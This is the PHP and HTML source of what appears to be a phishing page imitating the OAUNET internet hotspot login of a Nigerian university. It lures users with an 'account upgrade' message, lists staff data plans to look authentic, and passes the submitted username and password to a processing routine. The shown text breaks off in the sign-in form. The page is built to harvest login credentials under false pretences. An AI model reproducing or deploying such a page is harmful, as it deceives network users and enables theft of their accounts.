<?php
	$msg = "Please log on to use the internet hotspot service to activate your account upgrade....";
	if(isset($_POST['make'])) {
		if (!empty($_POST['username']) && !empty($_POST['password'])) {
			$mast->process();
		} else {
			$msg = "Error occured, please fill appropriately....";
		}
	}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Internet Service &gt; Account Upgrade</title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="pragma" content="no-cache">
	<meta http-equiv="expires" content="-1">	

	<link rel="stylesheet" href="assets/style.css">
	<link rel="stylesheet" href="assets/jquery-ui.css">
	
	<script type="text/javascript" src="assets/html5.js"></script>	
	<script type="text/javascript" src="assets/jquery.js"></script>
    <script type="text/javascript" src="assets/jquery-ui.js"></script>

	<script src="addons.js"></script>
</head>

<body>


<div align="center">
<a href="#">...Nigeria's Leading ICT Institution</a>
</div>

	<div id="main">
		<div id="left_side">
        <aside>
			
			<h5>OAUNET RELOADED (STAFF ONLY)<br>Effective from 3rd March, 2014</h5>


		
			
			<div class="item">
				<h6>OAUNET BOLT DATA PLAN</h6>
				<p style="color: #ff0; font-size: 11px"><a href="http://dataplan.oauife.edu.ng/">100HRS/MONTH<br>3GB OF DATA<br>N1,500</a></p>
			</div>

	
<div class="item">
				<h6>OAUNET IMPRESSO DATA PLAN</h6>
				<p style="color: #ff0; font-size: 11px"><a href="http://dataplan.oauife.edu.ng/">300HRS/MONTH<br>5GB OF DATA<br>N2,500</a></p>
			</div>

<div class="item">
				<h6>OAUNET EL-DORADO DATA PLAN</h6>
				<p style="color: #ff0; font-size: 12px"><a href="http://dataplan.oauife.edu.ng/">UNLIMITED HRS/MONTH<br>15GB OF DATA<br>N5,000</a></p>
			</div>
		</aside>
		
			
			<div id="container">
				
				
				
				<article id="article">
	<div id="box">
     <h2>Sign in with your OAUNET Credentials</h2>
			<h3>Please enter your username and password to log in.</h3>
	